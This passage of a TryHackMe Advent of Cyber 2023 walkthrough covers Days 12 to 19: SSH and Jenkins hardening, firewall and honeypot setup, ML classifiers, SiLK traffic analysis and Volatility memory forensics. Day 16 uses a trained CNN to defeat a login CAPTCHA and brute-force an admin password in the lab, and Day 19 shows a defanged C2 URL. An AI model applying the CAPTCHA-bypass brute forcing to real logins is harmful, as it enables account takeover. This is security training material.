![Advent of Cyber 2023 Day 12 - sudo -l error](tryhackme/images/aoc2023d12_sudo_l_error.png)

Now, lets harden the SSH configuration on the host. Editing the `/etc/ssh/sshd_config` file, we can reconfigure it so that password authentication is disabled - simply removing the `#` and changing `yes` to `no` on the line that reads `#PasswordAuthentication yes`:

![Advent of Cyber 2023 Day 12 - Disable Password Authentication](tryhackme/images/aoc2023d12_disable_password_auth.png)

Similarly, we can change the line that says `Include /etc/ssh/sshd_config/*.conf` and add a `#` at the start. Finally, we can save the file and restart the SSH service:

```console
$ sudo systemctl restart ssh
```

Now, when attempting to authenticate as `tracy` using the password, we are denied due to the lack of key-based authentication:

![Advent of Cyber 2023 Day 12 - SSH Error](tryhackme/images/aoc2023d12_ssh_error.png)

Finally, let's secure our Jenkins instance. To do this, we can navigate to `/var/lib/jenkins`. We see that there are two config files, `config.xml` and `config.xml.bak`:

![Advent of Cyber 2023 Day 12 - /var/lib/jenkins](tryhackme/images/aoc2023d12_var_lib_jenkins.png)

Opening this file, we can see that attributes `authorizationStrategy` and `securityRealm` have been commented out - denoted by `<!--` and `-->` syntax:

![Advent of Cyber 2023 Day 12 - Commented Out](tryhackme/images/aoc2023d12_commented_out.png)

Removing these comments, replacing `config.xml` with `config.xml.bak` and restarting Jenkins now results in the inner workings being inaccessible:

```console
$ rm config.xml
$ cp config.xml.bak config.xml
$ sudo systemctl restart jenkins
```

![Advent of Cyber 2023 Day 12 - Jenkins Sign In](tryhackme/images/aoc2023d12_jenkins_sign_in.png)

## Day 13 - To the Pots, Through the Walls

In light of recent events, McSkidy has built a team led by McHoneyBell, to research and investigation mitigation and proactive security in order to better the company's defensive security.

The team is looking to adopt the **Diamond Model**, an intrusion analysis framework used to understand adversary operations and identify elements of an intrusion. This framework comprises four core interconnected aspects:

- **Adversary**:
	- Adversary operator: the threat actor conducting malicious activity
	- Adversary customer: the party the reaps the rewards of conducting such activity
- **Victim**: the target of the threat actor's operation
- **Infrastructure**: the required systems and tools (physical and logical) that an adversary would deploy
- **Capabilities**: the tactics, techniques, and procedures adopted by the threat actor (ref: [MITRE ATT&CK](https://attack.mitre.org/))

![Advent of Cyber 2023 Day 13 - Diamond Model](tryhackme/images/aoc2023d13_diamond_model.png)

This model also stretches to the defensive side, particularly when looking at capabilities:

- **Threat hunting**: proactively looking for signs of malicious activity or security vulnerabilities within the organisation and develop the necessary playbooks for these threats
- **Vulnerability management**: identify, assess, prioritise, mitigate, and monitor vulnerabilities within the organisation

For the purposes of this exercise, two defensive infrastructure components are used, namely a **firewall** and a **honeypot**.

A firewall is a network security device which monitors and controls the flow of inbound and outbound traffic via predefined rules to prevent unauthorised access or data breaches. They come in many forms, including hardware, software, or a combination of both, and span many types:

- **Stateless/packet-filtering**: inspects and filters individual network packets based on rules that would point to a source or destination IP address, ports, and protocols. Effective for mitigating DDoS and port scans.
- **Stateful inspection**: tracks the state of network connections which can then be used to make filtering decisions. For example, if a packet is being channelled to the network as part of an established connection, it will be allowed; otherwise it will be blocked.
- **Proxy service**: protects the network by filtering messages at the application layer, providing deep packet inspection and more granular control over traffic. This firewall can block access to certain websites or block transmission of certain file types.
- **Web Application Firewall (WAF)**: designed to protect web applications and can prevent common attacks like SQLi, XSS, and DDoS attacks
- **Next-generation firewall**: combines functionalities of stateless, stateful, and proxy firewalls to create an all-encompassing intrusion detecting, prevention, and content filtering firewall

When we connect to our host, we see that the firewall is **inactive**:

```console
$ sudo ufw status
```

![Advent of Cyber 2023 Day 13 - Firewall Disabled](tryhackme/images/aoc2023d13_firewall_disabled.png)

This means we don't have any rules to block or allow traffic. We can set a **default policy** to **allow** outbound/outgoing and **deny** inbound/incoming traffic, as follows:

```console
# Allow outbound traffic
$ sudo ufw default allow outgoing

# Deny inbound traffic
$ sudo ufw default deny incoming
```

![Advent of Cyber 2023 Day 13 - Default Policies](tryhackme/images/aoc2023d13_default_policies.png)

On a more granular basis, we can add, modify, and delete rules for specific IP addresses, port numbers, services, or protocols. For example, if we want to allow inbound/incoming connections to port 22 (TCP SSH) over IPv4 and IPv6, we can run the following:

```console
$ sudo ufw allow 22/tcp
```

![Advent of Cyber 2023 Day 13 - Allow SSH](tryhackme/images/aoc2023d13_allow_ssh.png)

Firewall rules can then become more complex, incorporating specific IP addresses, subnets, or network interfaces.

```console
# Deny incoming connections from 192.168.100.25
$ sudo ufw deny from 192.168.100.25

# Deny incoming connections on network interface eth0 from 192.168.100.26
$ sudo ufw deny in on eth0 from 192.168.100.26
```

![Advent of Cyber 2023 Day 13 - Complex Rules](tryhackme/images/aoc2023d13_complex_rules.png)

Once we have added our rules, we can **enable** the firewall and check the rules we have set. If there are any issues or if rules are incorrectly configured, we can reset the firewall and rever it to its default state:

```
# Enable the firewall
$ sudo ufw enable

# Check status of firewall and rules set
$ sudo ufw status verbose

# Reset the firewall
$ sudo ufw reset
```

![Advent of Cyber 2023 Day 13 - Enable, Status, Reset](tryhackme/images/aoc2023d13_enable_status_reset.png)

Pivoting to the honeypot, there are two main types of note:

- **Low-interaction honeypots**: mimic simple systems like web servers or databases and gather intelligence on attacker behaviour and help detect new attacks
- **High-interaction honeypots**: emulate complex systems like OS's and networks and collect vast amounts of data on attacker behaviour to study their techniques to exploit vulnerabilities

On our system, we have a tool called **PenTBox** under `/home/vantwinkle/pentbox/pentbox-1.8`. To launch this tool, we navigate to the directory and run the Ruby (`.rb`) file:

```console
$ cd /home/vantwinkle/pentbox/pentbox-1.8
$ sudo ./pentbox.rb
```

![Advent of Cyber 2023 Day 13 - PenTBox Start](tryhackme/images/aoc2023d13_pentbox_start.png)

Selecting option 2, **Network tools**, and then the following **option 3**, **Honeypot**, we can choose our configuration option. We will choose **option 1**, **Fast Auto Configuration**:

![Advent of Cyber 2023 Day 13 - Network Honeypot](tryhackme/images/aoc2023d13_network_honeypot.png)

We can attempt to connect to our host on the honeypot port for testing:

![Advent of Cyber 2023 Day 13 - Intrusion Detected](tryhackme/images/aoc2023d13_intrusion_detected.png)

VanTwinkle has learned about firewalls and honeypots and provided us a bash script with a list of rules. We can run this as follows:

![Advent of Cyber 2023 Day 13 - VanTwinkle Script](tryhackme/images/aoc2023d13_vantwinkle_script.png)

Running a status check on the firewall, we see that only ports 80 (HTTP) and 22 (SSH) are allowed on both IPv4 and IPv6, with ports 21, 8088 and 8089 denied:

```console
$ sudo ufw status verbose
```

![Advent of Cyber 2023 Day 13 - Firewall Status](tryhackme/images/aoc2023d13_firewall_status.png)

Allowing port 8090 will result in the website being publicly-accessible which allows us to retrieve the flag:

```console
# Allow connections to/from port 8090
$ sudo ufw allow 8090/tcp

# Verify rule change
$ sudo ufw status verbose
```

![Advent of Cyber 2023 Day 13 - Updated Rule](tryhackme/images/aoc2023d13_updated_rule.png)

![Advent of Cyber 2023 Day 13 - Flag](tryhackme/images/aoc2023d13_flag.png)

## Day 14 - The Little Machine That Wanted To Learn

The CTO has poisoned the toy-making pipeline causing the elves to make defective toys. To solve this, McSkidy has placed the elves at points throughout the pipeline where they measure the toys to determine the location of the problematic elves. Unfortunately, this is not the optimal solution, so is looking at a machine learning alternative to solve it.

Broadly speaking, there are three main types of ML solutions:

- **Genetic algorithm**: mimics the process of natural selection through several rounds of offspring and mutations based on the provided parameters (survival of the fittest)
- **Particle swarm**: mimics bird flocks at specific points by creating a swarm of particles and aims to move all particles to the optimal answer's grouping point
- **Neural networks**: the most popular which mimics the neurons in the brain, receiving various inputs which are transformed and sent to the next neuron that are trained to perform the correct transformations to reach the answer

In the context of neural networks, there are two main styles in which they are trained:

- **Supervised learning**: uses a labelled dataset where the correct answers are known. The network gives an answer and we provide feedback on how accurate it was to the correct answer
- **Unsupervised learning**: Looks for interesting aspects of the data itself rather than being told what features to look for and is able to abstract a far greater number of dimensions and see patterns much better than humans

![Advent of Cyber 2023 Day 14 - Neural Network Structure](tryhackme/images/aoc2023d14_neural_net_structure.png)

As above, the neural network has three main layers:

- **Input layer**: First layer of nodes which receive a single data output that is passed to the hidden layer. The number of nodes = number of inputs (or parameters)
- **Output layer**: Last layer which sends the output received from the hidden layer. The number of nodes = number of network's outputs
- **Hidden layer**: intermediary layer(s) which is where the main action takes place. Each node receives multiple inputs from the nodes in the previous layer and transmits their answers to multiple nodes in the next layer

Within each node in the hidden layer, the inputs are first multiplied by a weighted value to help the neural network decide which inputs should contribute to the output more than others. The output is then entered into an **activation function** which decides if the node (neuron) will be active or not, casting this value to a decimal between 0 and 1 (or -1 and 1).

To train a neural network, we need to conduct two operations: **feed-forward** and **back-propagation**.

The **feed-forward** loop is the manner in which data is sent through the network in order to come to an answer. Once the network has been trained, this is the only step that is performed. At this point, we stop the training and simply want an answer from the network.

One round of the **feed-forward** loop is as follows:

1. **Normalise all inputs**: Adjust all inputs so that their ranges are the same
2. **Feed the inputs to our nodes in the input layer**: Provide one data entry for each input node in our network
3. **Propagate the data through the network**: Add all the inputs and run them through the activation function to retrieve the node's output - repeat until it reaches the output layer
4. **Read the output from the network**: Receive the output from the output layer - the answer will be a decimal between 0 and 1 (or -1 and 1) which is then rounded to get a binary answer from each node

We then need to tell how close the network was to the correct answer via **back propagation**:

1. **Calculate difference in observed outputs vs. expected outputs**: Since we know the expected outputs, we can tell the neural network how close it was to the answer by comparing the result from the activation function to the correct answer
2. **Update weights**: Using this difference, update the weights to each input to the nodes in the output layer
3. **Propagate the difference**: Calculate what the difference would be for the previous nodes and update the weights of the nodes in that layer. Repeat until the weights for the input layer have been updated.

It is vital not to overtrain neural networks - it must learn the process rather than the answers we give it. To validate the training, we split our overall dataset into three:

- **Training data**: largest of the three (usually 70-80% of the original dataset)
- **Validation data**: used to validate training to determine its performance (usually 10-15% of the original dataset). If performance starts to decline, we know we are overtraining
- **Testing data**: dataset used to calculate the final performance of the network. This dataset is unseen until the training is complete (usually 10-15% of the original dataset)

We can now tackle the challenges in the room! For this exercise, we are given three files:

- `detector.py`: script to build our neural network
- `dataset_train.csv`: training dataset (both measurements and a flag of whether the toy is defective or not have been captured)
- `dataset_test.csv`: test dataset (only measurements of toys are captured)

Opening `detector.py`, we see the code first inputs various modules including `pandas`, `numpy`, and `sklearn` to build the network. Then, the datasets are loaded and inputs are encoded to their relevant colour scheme. Finally, the data is loaded into variable `X` and labels stored in variable `y`. The variable `test_X` stores the testing dataset to perform predictions.

We need to split the datasets into a 80/20 split. To do this, we add the following line:

```python
train_X, validate_X, train_y, validate_y = train_test_split(X, y, test_size=0.2)
```

Next, we need to normalise our data:

```python
scaler = StandardScaler()
scaler.fit(train_X)
 
train_X = scaler.transform(train_X)
validate_X = scaler.transform(validate_X)
test_X = scaler.transform(test_X)
```

Finally, we need to train our neural network:

```python
clf = MLPClassifier(solver='lbfgs', alpha=1e-5,hidden_layer_sizes=(15, 2), max_iter=10000)
```

This will create a [MLP classifier](https://scikit-learn.org/stable/modules/generated/sklearn.neural_network.MLPClassifier.html, `clf`, with values as follows:

- `solver`: the algorithm used to update the weights
- `alpha`: used for regularisation of the network
- `hidden_layer_sizes`: the structure of the hidden layers (2 layers with 15 nodes each)
- `max_iter`: cap the number of training iterations

Next, we train our classifier:

```python
clf.fit(train_X, train_y)
```

When this is complete, our neural network has been trained successfully.

Our next step is to validate our network by asking it to predict the values based on the validation dataset:

```python
y_predicted = clf.predict(validate_X)
```

Our final step is to ask the neural network to make predictions on the test data that was not labelled by the elves:

```python
y_test_predictions = clf.predict(test_X)
```

Running this in the terminal:

```console
$ python3 detector.py
```

![Advent of Cyber 2023 Day 14 - Detector](tryhackme/images/aoc2023d14_detector.png)

We can see our accuracy is `91.92%` which is good enough to be uploaded to `http://websiteforpredictions.thm:8000/`:

![Advent of Cyber 2023 Day 14 - Flag](tryhackme/images/aoc2023d14_flag.png)

We now have a working neural network which allows us to remove all of the defective toys with an accuracy of up to `91.48%`!

## Day 15 - Jingle Bell SPAM: Machine Learning Saves the Day!

Over the merger period, the Best Festival Company has been receiving a large number of credential harvesting emails. It turns out that the spam detector has been disabled (or damaged) since just before the merger, so McSkidy has decided to come up with their own ML solution using a sample dataset collected from various sources.

For this lab, we will be using Jupyter Notebooks, an environment which allows you to write and execute code in real-time, thus making it ideal for data analysis. We will use this to build a ML pipeline, a series of steps which involves building and deploying an ML model:

![Advent of Cyber 2023 Day 15 - ML Model](tryhackme/images/aoc2023d15_ml_pipeline.png)

The first step is to import the required libraries, specifically Numpy and Pandas:

```python
import numpy as np
import pandas as pd
```

Using these libraries, we can then proceed with **data collection** by reading the data with Pandas:

```python
data = pd.read_csv("emails_dataset.csv")
print(data.head())    # Test imported dataset
```

From there, we convert our CSV data to a Pandas DataFrames which is a more structured and tabular representation of the data which makes it easier to manipulate and analyse:

```python
df = pd.DataFrame(data)
print(df)    # Test dataframe conversion
```

Our next step is to conduct data preprocessing which involves cleaning the raw data into an organised and structured format suitable for ML.

Using `CountVectorizer` from `scikit-learn`, we can transform the text within our data into a numerical format so that the ML model can make decisions:

```python
from sklearn.feature_extraction.text import CountVectorizer
vectorizer = CountVectorizer()
X = vectorizer.fit_transform(df['Message'])
```

With our data in the correct format, we now must split the dataset into a training set (80%) and a test set (20%):

```python
from sklearn.model_selection import train_test_split
y = df['Classification']
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)
```

With our training dataset, we can now train our model, specifically using Naive Bayes classification:

```python
from sklearn.naive_bayes import MultinomialNB
clf = MultinomialNB()
clf.fit(X_train, y_train)
```

When `fit` is called with our training data (`X_train`) and labels (`y_train`), the `MultinomialNB` goes through the data and learns patters, ultimately producing a ML model which can be used to make predictions on unseen data.

To evaluate our model's effectiveness, we specifically look at its precision, recall, and accuracy:

```python
from sklearn.metrics import classification_report
y_pred = clf.predict(X_test)
print(classification_report(y_test, y_pred))
```

- **Precision**: ratio of correctly predicted positive observations
- **Recall (sensitivity)**: ratio of correctly predicted positive observations to all the actual positives
- **F1-score**: mean of the precision and recall metrics - better measure for incorrectly classified cases than an accuracy metric
- **Support**: number of actual occurrences of the class in the dataset
- **Accuracy**: ratio of correctly predicted observations to the total observations
- **Macro Avg**: averages the unweighted mean per label
- **Weighted Avg**: averages the supported-weighted mean per label

With our model, we can use it to classify new messages and determine if they are spam:

```python
message = vectorizer.transform(["Today's Offer! Claim ur £150 worth of discount vouchers! Text YES to 85023 now! SavaMob, member offers mobile! T Cs 08717898035. £3.00 Sub. 16 . Unsub reply X "])
prediction = clf.predict(message) 
print("The email is :", prediction[0]) 
```

McSkidy looks to be happy with our detection model and has supplied a dataset of test emails, `test_emails.csv`, to test our model results:

```python
test_data = pd.read_csv("test_emails.csv")
print(test_data.head())

X_new = vectorizer.transform(test_data['Messages'])
new_predictions = clf.predict(X_new)
results_df = pd.DataFram({'Messages': test_data['Messages'], 'Prediction': new_predictions})
print(results_df)
```

![Advent of Cyber 2023 Day 15 - New Spam](tryhackme/images/aoc2023d15_new_spam.png)

From the above, we see **3 spam emails** have been identified in the test dataset.

We can print these out and view the flag:

```python
spam_emails = [results_df['Messages'][0], results_df['Messages'][5], results_df['Messages'][7]]
for s in spam_emails:
    print(f'{s}\n')
```

![Advent of Cyber 2023 Day 15 - Flag](tryhackme/images/aoc2023d15_flag.png)

## Day 16 - Can't CAPTCHA this Machine!

In an attempt to cause more disruption, McGreedy has locked McSkidy out of the Elf(TM) HQ admin panel. To prevent automated credential attacks, McGreedy has included a CAPTCHA in the login form.

However, McSkidy is looking to leverage ML to build a custom brute force script to solve the CAPTCHA.

To do this, we will use **Convolutional Neural Networks (CNN)** which are able to extract features to then train a neural network. CNNs comprise three main components:

- Feature extraction
- Fully-connected layers
- Classification

To perceive the characters in the CAPTCHA, the system looks at the 2D array of pixels and the values they hold, either in RGB (three numbers between 0-255) or greyscale (single number 0-255):

![Advent of Cyber 2023 Day 16 - CAPTCHA Pixels](tryhackme/images/aoc2023d16_captcha_pixels.png)

For feature extraction, the CNN first reduces the size of the input through **convolution** which summarises the image by crafting a smaller 2D array of pixel values. Doing this reduces the size of the network while still maintaining high accuracy in the model.

The next step is **pooling** which further summarises the image using statistical methods. For each kernel within the image, a summary is generated using max or average pooling which calculates the max or average value of the pixels, respectively.

![Advent of Cyber 2023 - Day 16 - Pooling](tryhackme/images/aoc2023d16_pooling.png)

Now that the features have been extracted, the next step is to build the network where each node connects to all nodes in the next layre.

Finally, the network will produce a range of outputs which indicate the values in the CAPTCHA. For this we need an output node for 0 to 9, totaling 10 output nodes. Each node will produce a decimal value between 0 and 1 which is then summarised by taking the highest value as the answer.

To access our provided docker container:

```console
# Start docker with tensorflow and aocr
$ docker run -d -v /tmp/data:/tempdir/ aocr/full

# Print out container IDs
$ docker ps

# Connect to the container
$ docker exec -it <CONTAINER_ID> /bin/bash
$ cd /ocr/
```

![Advent of Cyber 2023 Day 16 - Docker Connect](tryhackme/images/aoc2023d16_docker_connect.png)

In order to gather the data to train our CNN, we can look at the authentication portal at `http://hqadmin.thm:8000/` and capture the generated CAPTCHAs:

![Advent of Cyber 2023 Day 16 - Auth Portal](tryhackme/images/aoc2023d16_auth_portal.png)

We can get the raw image via cURL which produces a Base64-encoded version of the CAPTCHA. We can write a script to extract the image but this has already been done for us, as we are provided with a dataset in `raw_data/dataset`.

With our provided dataset, we can train our CNN as follows:

```console
$ cd labels && aocr train training.tfrecords
```

After this completes, the model can be tested by running the following:

```console
$ aocr test testing.tfrecords
```

With our model built and tested, we need to now host the CNN using TensorFlow Serving.  First we need to export the model from docker:

```console
$ cd /ocr/ && cp -r model /tempdir/
```

Next, exit docker and kill the container:

```console
$ exit
$ docker ps
$ docker kill <CONTAINER_ID>
```

Now, run the following to run a TensorFlow Serving docker container which will expose an API that we can use to interface with the hosted model to sent it a CAPTCHA for prediction - `http://localhost:8501/v1/model/ocr/`.

```console
$ docker run -t --rm -p 8501:8501 -v /tmp/data/model/exported-model:/models/ -e MODEL_NAME=ocr tensorflow/serving
```

With this, we can run the `bruteforcer.py` script and retrieve McSkidy's password:

```console
$ python3 ~/Desktop/bruteforcer/bruteforcer.py
```

![Advent of Cyber 2023 Day 16 - McSkidy's Password](tryhackme/images/aoc2023d16_mcskidy_password.png)

Logging into the admin portal, we retrieve the flag:

![Advent of Cyber 2023 Day 16 - Flag](tryhackme/images/aoc2023d16_flag.png)

## Day 17 - I Tawt I Taw A C2 Tat!

Santa's Security Operations Centre (SSOC) needs to see the big picture to identify, scope, prioritise, and evaluate the anomalies we have found during our investigation in order to manage this ongoing situation effectively.

They provided us with a VM running SiLK (Systsem for Internet Knowledge) toolkit version `3.19.1`. We are also provided a binary flow `suspicious-flows.silk` which we can summarise using `rwfileinfo`:

![Advent of Cyber 2023 Day 17 - SiLK rwfileinfo](tryhackme/images/aoc2023d17_silk_rwfileinfo.png)

There are numerous utilities bundled with SiLK. `rwcut` reads the binary flow records and prints the selected fields in text format:

```console
# Print all binary flow records
$ rwcut <FILENAME>

# Print the top 5 records
$ rwcut <FILENAME> --num-recs=5

# Print the last 5 records
$ rwcut <FILENAME> --tail-rec=5

# Specify fields for output
$ rwcut <FILENAME> --fields=protocol,sIP,sPort,dIP,dPort,duration,sTime,dTime
```

For example, the **date of the sixth record** is `2023/12/05T09:33:07.755`:

```console
$ rwcut <FILENAME> --fields=sTime,sIP,dIP --num-recs=6
```

Note, network traffic displays protocol information in decimal format, e.g., ICMP=1, IPv4=4, TCP=6, UDP=17.

`rwfilter` is an essential part of SiLK that comes bundled with multiple filters for flow analysis, however, it requires its output to be post-processed. This means it is often used with `rwcut` to output the information:

```console
# Filter binary flow records
$ rwfilter <FILENAME>

# Filter records for UDP records, passing the output to the terminal via rwcut
$ rwfilter <FILENAME> --proto=17 --pass=stdout | rwcut --num-recs=5
```

This filtering can be extended, as follows:

- **Protocols** (values: 0-255):
	- `--proto`
- **Ports** (values: 0-65535):
	- `--aprot`: any port
	- `--sport`: source port
	- `--dport`: destination port
- **IP filters:**
	- `--any-address`: any IP
	- `--saddress`: source IP
	- `--daddress`: destination IP
- **Volume filters**:
	- `--packets`: number of packets
	- `--bytes`: number of bytes

For example, displaying the first 6 UDP records shows the **sixth record's destination port** is **49950** :

```console
$ rwfilter suspicious-flows.silk --proto=17 --pass=stdout | rwcut --num-recs --fields=dPort
```

Using the above filters, `rwstats` can also be used to look at events of interest:

```
$ rwstats <FILENAME> --fields=<FIELD1>,<FIELD2>
```

For example, filtering on volume per port shows port 53 (DNS) makes up `35.332088%` of the overall records (`%Records`):

```
$ rwstats suspicious-flows.silk --fields=dPort --values=records,packets,bytes,sIP-Distinct,dIP-Distinct --count=10
```

With all of this information, we can now hunt for the anomalies in the network. First, we can list out the top source IPs on the network:

```console
$ rwstats suspicious-flows.silk --fields=sIP --values=bytes --count=10 --top
```

![Advent of Cyber 2023 Day 17 - Top IPs](tryhackme/images/aoc2023d17_top_ips.png)

We can see that `175.219.238.243`, `175.175.173.221`, and `175.215.235.223` make up the most of the traffic in the network. We can look at the top communication pairs to see if any of them are communicating with each other:

```console
$ rwstats suspicious-flows.silk --fields=sIP,dIP --values=records,bytes,packets --count=10
```

![Advent of Cyber 2023 Day 17 - Communication Pairs](tryhackme/images/aoc2023d17_communication_pairs.png)

This confirms these IPs are creating the majority of the noise on the network. From earlier, we found that DNS makes up a large proportion of the traffic, so we can pivot on this to ascertain who is creating this traffic:

```console
$ rwfilter suspicious-flows.silk --aport=53 --pass=stdout | rwstats --fields=sIP,dIP --values=records,bytes,packets --count=10
```

![Advent of Cyber 2023 Day 17 - DNS Summary](tryhackme/images/aoc2023d17_dns_summary.png)

We can then look at the frequency pf this communication, as follows:

```console
$ rwfilter suspicious-flows.silk --sadddress=175.175.173.221 --dport=53 --pass=stdout | rwcut --fields=sIP,dIP,stime | head -10
```

![Advent of Cyber 2023 Day 17 - DNS Frequency](tryhackme/images/aoc2023d17_dns_frequency.png)

We can see over 10 DNS requests occur in less than a second, confirming this as suspicious traffic. Filtering on the other `sIP` does not show any DNS requests.

Before concluding the DNS analysis, we can check if any hosts have interacted with the `175.175.173.221` IP:

```console
$ rwfilter suspicious-flows.silk --any-address=175.175.173.221 --pass=stdout | rwcut --fields=sIP,dIP,stime --count=10
```

![Advent of Cyber 2023 Day 17 - Interacting Hosts](tryhackme/images/aoc2023d17_interacting_hosts.png)

From the above, we see `205.213.108.99` has interacted with this suspicious host, so we can pivot to this new connection pair to summarise the ports which we see it interact:

```console
$ rwfilter suspicious-flows.silk --any-address=205.213.108.99 --pass=stdout | rwstats --fields=sIP,sPort,dIP,dPort --count=10
```

![Advent of Cyber 2023 Day 17 - Other IP Summary](tryhackme/images/aoc2023d17_other_ip_summary.png)

We see four records on UDP port 123 which is used by the NTP service. As the volume of this is very low, we can assess this as legitimate traffic.

Continuing with our analysis, we can analyse the port 80 traffic which was highlighted previously as having high volumes:

```console
$ rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP --count=10
```

![Advent of Cyber 2023 Day 17 - Port 80 Connection Pairs](tryhackme/images/aoc2023d17_port_80_pairs.png)

Revealing the IP that created the noise by focusing on the destination port:

```console
$ rwfilter suspicious-flows.silk --aport=80 --pass=stdout | rwstats --fields=sIP,dIP,dPort --count=10
```

![Advent of Cyber 2023 Day 17 - Port 80 dPort](tryhackme/images/aoc2023d17_port_80_dport.png)

From this, we can reveal that IP `175[.]215[.]236[.]223` has generated this traffic. Let's view the frequency and flags of the requests being sent:

```console
$ rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwcut --fields=sIP,dIP,dPort,flag,stime | head
```

![Advent of Cyber 2023 Day 17 - Port 80 Frequency](tryhackme/images/aoc2023d17_port_80_frequency.png)

From the `flags`, we can see that a number of SYN packets were sent in less than a second. Viewing these packets sent by this host:

```console
$ rwfilter suspicious-flows.silk --saddress=175.215.236.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10
```

![Advent of Cyber 2023 Day 17 - No ACK](tryhackme/images/aoc2023d17_no_ack.png)

From the above, we see that no ACK packets were sent by this host, indicating this is a potential DoS attack. To confirm, we can look at the answers provided by the destination host:

```console
$ rwfilter suspicious-flows.silk --saddress=175.215.235.223 --pass=stdout | rwstats --fields=sIP,flag,dIP --count=10
```

![Advent of Cyber 2023 Day 17 - SYN ACK](tryhackme/images/aoc2023d17_syn_ack.png)

We see that the destination address sends SYN-ACK packets to complete the three-way handshake. However, as the source address only sends SYN packets (no ACK), this confirms this is a DoS attack as the three-way handshake is incomplete.

For due diligence, we can check for any interactions from this host, as follows:

```console
$ rwfilter suspicious-flows.silk --any-address=175.236.223 --pass=stdout | rwstats --fields=sIP,dIP --count=10
```

![Advent of Cyber 2023 Day 17 - Due Diligence](tryhackme/images/aoc2023d17_due_diligence.png)

Thankfully, there are no additional interactions, so we can conclude our investigation.

## Day 18 - A Gift That Keeps on Giving

During the investigation of an insider threat, it was determined that a production server was using a suspiciously high number of resources. The blue team managed to narrow it down to a single process but it has to be eradicated from where the process has embedded itself.

Running the `top` command, we can see the dynamic processes running on the system. Most notably, we see that process with PID `645` and command `a` is using `100.0%` of the CPU:

![Advent of Cyber 2023 Day 18 - top](tryhackme/images/aoc2023d18_top.png)

However, killing this process with `sudo kill <PID>` will not work as the process will spawn again.

Viewing the crontabs, we see there are two processes which involve a VNC server:

```console
$ crontab -l
```

![Advent of Cyber 2023 Day 18 - User Crontab](tryhackme/images/aoc2023d18_user_crontab.png)

Given the user running the processes is `root`, we can also check the `root` user's cronjobs since every user has their own, but this does not return any valuable information.

```console
$ sudo su
$ crontab -l
```

As the service automatically restarts when it is killed, we can use `systemctl` to list all enabled services:

```console
$ systemctl list-unit-files | grep enabled
```

![Advent of Cyber 2023 Day 18 - Enabled Services](tryhackme/images/aoc2023d18_enabled_services.png)

We can check the status for this service:

```console
$ systemctl status a-unkillable.service
```

![Advent of Cyber 2023 Day 18 - Status](tryhackme/images/aoc2023d18_status.png)

We can now confirm the rogue service is running from `/etc/systemd/system/a service` and the process is `/etc/systemd/system/a`. We can permanently delete it by deleting the files:

```console
$ rm -rf /etc/systemd/system/a
$ rm -rf /etc/systemd/system/a-unkillable.service
```

## Day 19 - CrypTOYminers Sing Volala-lala-latility

Within Santa's Security Operation Centre (SSOC) the elves are looking further into the insider threat. Log McBlue discovers some suspicious traffic originating from one of the Linux database servers and attempts to create a memory dump of the server as well as a Linux profile.

To analyse the memory dump, we can use Volatility, a command-line utility to perform memory analysis.

```console
$ vol.py -h
```

To interpret the memory dump, we use a profile which defines the operations system's architecture, version, and various memory specific to the target system. These profiles can be viewed as follows:

```console
$ vol.py --info
```

However, Linux profiles must be manually created from the same device the memory is dumped from:

- Each distribution may have different kernel versions, configurations and memory layouts making it difficult to create a universal Linux profile
- Linux kernel internals can vary across distributions and versions, unlike Windows which has a more standardised memory structure and system APIs
- Linux is open-source which has led to greater flexibility and customisation but also more variability in memory structures

We first need to copy the profile to where Volatility stores its profiles:

```console
$ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
$ vol.py --info | grep Ubuntu
```

![Advent of Cyber 2023 Day 19 - Copy Profile](tryhackme/images/aoc2023d19_copy_profile.png)

We can use the `linux_bash` plugin to look at the `history` file to see which commands were executed by the malicious actor:

```console
$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
```

![Advent of Cyber 2023 Day 19 - Linux Bash](tryhackme/images/aoc2023d19_linux_bash.png)

From the above, we can see that the `msql` command was used by the elf analyst but `cat /home/elfie/.bash_history` was not, which means the threat actor has likely used the exposed credentials to access the database.

In addition, the `curl` and `./miner` commands was confirmed not to be executed by the elf meaning that the malicious actor has downloaded a file to the system and successfully executed it.

We can look at the  running processes to identify any anomalies in relation to the above findings using the `linux_pslist` plugin:

```console
$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
```

![Advent of Cyber 2023 Day 19 - Running Processes](tryhackme/images/aoc2023d19_running_processes.png)

We can see the `miner` process is running under PID `10280`. Based on its name, we can hypothesise this is a cryptocurrency miner. The above output also indicates the `mysqlserver` process is suspicious, since the real process for MySQL is `mysqld`. Given the PPID is different from the miner process, this did not spawn from `miner` directly.

As we have narrowed down the processes, we want to extract the binaries associated with these processes. To do this, we can make a directory called `extracted` and use the `linux_procdump` plugin:

```console
$ mkdir extracted
$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p <PID>
```

![Advent of Cyber 2023 Day 19 - linux procdump](tryhackme/images/aoc2023d19_linux_procdump.png)

From here, we can conduct basic file analysis to extract some indicators of compromise (IoCs). We first compute the MD5 hash of each file using `md5sum`:

```console
$ md5sum <FILENAME>
```

![Advent of Cyber 2023 Day 19 - md5sum](tryhackme/images/aoc2023d19_md5sum.png)

Running `strings` against the extracted miner binary reveals a suspicious URL:

```console
$ strings extracted/miner.10280
```

```
hxxp[://]mcgreedysecretc2[.]thm
```

As part of our analysis, we want to look at cronjobs for any persistence mechanisms employed by the threat actor. Using `linux_enumerate_files` and `grep` we can filter on `cron`:

```console
$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron
```

![Advent of Cyber 2023 Day 19 - Cronjobs](tryhackme/images/aoc2023d19_cronjobs.png)

We discover a `/var/spool/cron/crontabs/elfie` cronjob which we cam then extract via `linux_find_file` supplying its inode value `0xffff9ce9b78280e8`:

```console
$ vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie
```

Running strings on this file reveals the malicious persistent cronjob set up by the threat actor:

![Advent of Cyber 2023 Day 19 - elfie](tryhackme/images/aoc2023d19_elfie.png)

